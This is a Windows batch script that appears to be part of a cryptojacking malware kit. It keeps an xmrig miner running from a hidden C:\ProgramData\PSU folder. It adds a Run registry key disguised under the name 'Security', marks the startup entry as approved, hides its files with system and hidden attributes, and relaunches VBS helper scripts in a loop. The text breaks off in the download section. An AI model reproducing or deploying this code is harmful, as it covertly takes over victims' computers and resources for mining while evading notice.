tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
if "%ERRORLEVEL%"=="1" goto execute
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
attrib +h +s +r "C:\ProgramData\PSU"
attrib +h +s +r "C:\ProgramData\PSU\check.bat"
attrib +h +s +r "C:\ProgramData\PSU\smb.bat"

goto start
:execute
if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
if not exist "C:\ProgramData\PSU\execute.vbs" goto download
start "" "C:\ProgramData\PSU\samba.vbs"
start "" "C:\ProgramData\PSU\execute.vbs"
timeout 3
goto start
:download
timeout 0 >> nul
mkdir "C:\ProgramData\PSU"
timeout 0 >> nul
